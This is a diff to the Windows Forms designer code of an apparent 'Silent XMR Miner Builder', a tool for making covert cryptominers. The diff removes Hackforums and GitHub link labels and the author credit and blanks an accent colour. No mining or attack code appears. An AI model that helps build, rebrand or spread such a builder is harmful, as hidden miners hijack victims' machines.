@@ -113,8 +113,6 @@ Partial Class Form1
         Me.Label29 = New System.Windows.Forms.Label()
         Me.Label30 = New System.Windows.Forms.Label()
         Me.txtStartDelay = New project.MephTextBox()
-        Me.labelHackforums = New System.Windows.Forms.LinkLabel()
-        Me.labelGitHub = New System.Windows.Forms.LinkLabel()
         Me.txtLog = New project.MephTextBox()
         Me.btnBuild = New project.MephButton()
         Me.MephForm1.SuspendLayout()
@@ -403,7 +401,7 @@ Partial Class Form1
         '
         'MephForm1
         '
-        Me.MephForm1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.MephForm1.AccentColor = System.Drawing.Color.Empty
         Me.MephForm1.Anchor = System.Windows.Forms.AnchorStyles.None
         Me.MephForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer))
         Me.MephForm1.Controls.Add(Me.MephTabcontrol2)
@@ -415,7 +413,7 @@ Partial Class Form1
         Me.MephForm1.MinimumSize = New System.Drawing.Size(535, 272)
         Me.MephForm1.Name = "MephForm1"
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
-        Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
+        Me.MephForm1.SubHeader = ""
         Me.MephForm1.TabIndex = 0
         Me.MephForm1.Text = "Silent XMR Miner Builder 1.5.1"
         '
@@ -1334,8 +1332,6 @@ Partial Class Form1
         Me.TabPage5.Controls.Add(Me.Label29)
         Me.TabPage5.Controls.Add(Me.Label30)
         Me.TabPage5.Controls.Add(Me.txtStartDelay)
-        Me.TabPage5.Controls.Add(Me.labelHackforums)
-        Me.TabPage5.Controls.Add(Me.labelGitHub)
         Me.TabPage5.Controls.Add(Me.txtLog)
         Me.TabPage5.Controls.Add(Me.btnBuild)
         Me.TabPage5.Location = New System.Drawing.Point(89, 4)
@@ -1381,30 +1377,6 @@ Partial Class Form1
         Me.txtStartDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
         Me.txtStartDelay.UseSystemPasswordChar = False
         Me.txtStartDelay.WordWrap = False
-        '
-        'labelHackforums
-        '
-        Me.labelHackforums.AutoSize = True
-        Me.labelHackforums.LinkColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
-        Me.labelHackforums.Location = New System.Drawing.Point(57, 167)
-        Me.labelHackforums.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
-        Me.labelHackforums.Name = "labelHackforums"
-        Me.labelHackforums.Size = New System.Drawing.Size(77, 17)
-        Me.labelHackforums.TabIndex = 22
-        Me.labelHackforums.TabStop = True
-        Me.labelHackforums.Text = "Hackforums"
-        '
-        'labelGitHub
-        '
-        Me.labelGitHub.AutoSize = True
-        Me.labelGitHub.LinkColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
-        Me.labelGitHub.Location = New System.Drawing.Point(8, 167)
-        Me.labelGitHub.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
-        Me.labelGitHub.Name = "labelGitHub"
-        Me.labelGitHub.Size = New System.Drawing.Size(48, 17)
-        Me.labelGitHub.TabIndex = 21
-        Me.labelGitHub.TabStop = True
-        Me.labelGitHub.Text = "GitHub"
         '
         'txtLog
         '
@@ -1511,8 +1483,6 @@ Partial Class Form1
     Friend WithEvents Label9 As Label
     Friend WithEvents Label5 As Label
     Friend WithEvents txtAlgorithm As MephComboBox
-    Friend WithEvents labelHackforums As LinkLabel
-    Friend WithEvents labelGitHub As LinkLabel
     Friend WithEvents TabPage6 As TabPage
     Friend WithEvents Label4 As Label
     Friend WithEvents toggleEnableGPU As MephToggleSwitch
